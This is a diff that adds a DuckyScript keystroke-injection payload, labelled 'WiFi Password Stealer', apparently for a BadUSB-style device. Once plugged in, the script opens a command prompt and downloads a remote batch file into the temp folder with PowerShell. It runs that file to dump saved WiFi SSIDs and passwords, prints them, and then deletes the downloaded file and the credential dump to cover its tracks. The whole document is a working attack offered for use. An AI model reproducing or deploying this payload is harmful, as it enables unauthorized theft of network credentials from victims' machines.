@@ -1,0 +1,51 @@
+REM Author: iron web10
+REM Description: WiFi Password Stealer By iron web10
+REM Version: 0.1
+
+DELAY 1000
+REM Opening the command prompt
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 3000
+
+REM Navigating to the temp folder for downloading the .bat file
+STRING cd %TEMP%
+DELAY 500
+ENTER
+
+REM Downloading the .bat file using PowerShell
+STRING powershell -Command "Invoke-WebRequest -Uri 'https://bruce-hub.vercel.app/scripts/BadBlue/wifi-password-stealer/beta.bat' -OutFile '%TEMP%\\beta.bat'"
+DELAY 500
+ENTER
+DELAY 6000
+
+REM Executing the .bat file
+STRING beta.bat
+DELAY 500
+ENTER
+DELAY 6000
+
+REM Displaying the SSID and Password from the wifi_credentials.txt file
+STRING type wifi_credentials.txt
+DELAY 500
+ENTER
+DELAY 2000
+
+REM Deleteing the credentials file to clean up
+STRING if exist "%TEMP%\\wifi_credentials.txt" del "%TEMP%\\wifi_credentials.txt"
+DELAY 500
+ENTER
+
+REM Deleteing the beta.bat file to clean up
+STRING if exist "%TEMP%\\beta.bat" del "%TEMP%\\beta.bat"
+DELAY 500
+ENTER
+
+DELAY 800
+echo Press Enter to exit.
+ENTER
+DELAY 500
+STRING pause && exit
